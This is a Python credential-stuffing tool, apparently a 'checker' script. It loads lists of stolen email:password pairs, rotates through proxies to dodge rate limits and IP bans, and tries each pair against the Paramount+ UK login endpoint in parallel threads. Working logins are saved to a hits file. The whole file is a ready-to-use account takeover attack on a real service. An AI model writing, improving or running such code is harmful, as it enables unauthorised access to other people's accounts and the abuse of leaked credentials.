import time, json, threading, httpx, os, itertools
from colorama import Fore, init; init()

__LOCK__ = threading.Lock()
__CONFIG__ = json.load(open('./config.json'))
__PROXIES__ = itertools.cycle(open(__CONFIG__['path_proxies'], 'r+').read().splitlines())

class Console:
    @staticmethod
    def printf(content: str):
        __LOCK__.acquire()
        print(content.replace('+', f'{Fore.GREEN}+{Fore.RESET}').replace('-', f'{Fore.RED}-{Fore.RESET}'))
        __LOCK__.release()
    
    @staticmethod
    def print_logo():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + ''' 
  __  __           _        _             _   _ _       _       _____                
 |  \/  |         | |      | |           | \ | (_)     (_)     |  __ \               
 | \  / | __ _  __| | ___  | |__  _   _  |  \| |_ _ __  _  __ _| |__) |__ _  ___ ___ 
 | |\/| |/ _` |/ _` |/ _ \ | '_ \| | | | | . ` | | '_ \| |/ _` |  _  // _` |/ __/ __|
 | |  | | (_| | (_| |  __/ | |_) | |_| | | |\  | | | | | | (_| | | \ \ (_| | (_| (__ 
 |_|  |_|\__,_|\__,_|\___| |_.__/ \__, | |_| \_|_|_| |_| |\__,_|_|  \_\__,_|\___\___|
                                   __/ |              _/ |                           
                                  |___/              |__/                            


        ''' + Fore.LIGHTWHITE_EX)

class Check(threading.Thread):
    def __init__(self, email: str, password: str) -> None:
        self.password = password
        self.email = email

        threading.Thread.__init__(self)
    
    def run(self):
        while True:
            try:
                with httpx.Client(proxies= f'http://{next(__PROXIES__)}', timeout=__CONFIG__['proxy_timeout']) as client:
                    response = client.post('https://www.paramountplus.com/gb/aa-app-xhr/login/', json={'username': self.email, 'password': self.password})

                    if False not in [content not in response.text for content in ['The username or password provided is incorrect', 'Too many failed attempts']]:
                        Console.printf(f'[+] Hit: {self.email}:{self.password}\n')

                        with open('./hit.txt', 'a+') as f:
                            f.write(f'{self.email}:{self.password}\n')
                        break
                    elif 'Your IP' in response.text: # Cloudfare ip ban
                        return
                    else:
                        Console.printf(f'[-] Bad: {self.email}:{self.password}\n')
                        break
            except Exception as e:
                with open('./log.txt', 'a+') as de:
                    de.write(f'{next(__PROXIES__)} errored with error: {e} \n')
                pass

if __name__ == '__main__':
    Console.print_logo()

    for account in list(set(open(__CONFIG__['path_combo'], 'r+').read().splitlines())):
        while threading.active_count() >= __CONFIG__['threads']:
            time.sleep(0)
        
        combo = account.split(':')
        Check(combo[0], combo[1]).start()
